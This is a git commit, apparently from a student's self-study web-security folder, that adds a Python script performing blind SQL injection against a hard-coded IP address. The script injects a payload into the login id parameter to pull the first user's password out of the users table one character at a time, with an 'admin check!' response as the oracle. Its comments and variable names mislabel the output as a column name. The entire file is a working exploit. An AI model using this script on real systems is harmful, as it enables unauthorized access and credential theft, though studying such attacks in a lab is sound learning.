a6d6aebc3554526729d69666674c0a9dece6e56e
yws <ywspml@naver.com>
2024-08-13 10:12:35 +0900

    07/09 ~ 07/10

---
+++ Master Plan/03. 웹 구조/Self-study/password.py
@@ -0,0 +1,25 @@
+import requests
+
+url = 'http://13.209.81.224:6060/index.php'
+found_column_name = ''
+column_index = 1
+#chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
+chars = ''.join([chr(i) for i in range(32, 127)])  # ASCII 값 범위: 32부터 126까지 모든 문자
+position = 1  # We will start with the first character of the column name
+
+while True:
+    for char in chars:
+        payload = f"admin' AND (ASCII(SUBSTRING((select password from users limit 0,1), {position}, 1)) = ASCII('{char}')) -- "
+        params = {'id': payload, 'password': '123'}
+        response = requests.get(url, params=params)
+        
+        if 'admin check!' in response.text:  # Modify this line to match the specific success message
+            found_column_name += char
+            print(f"Column name so far: {found_column_name}")
+            position += 1
+            break
+    else:
+        # Exit the loop if no matching character is found
+        break
+
+print(f"Final column name: {found_column_name}")
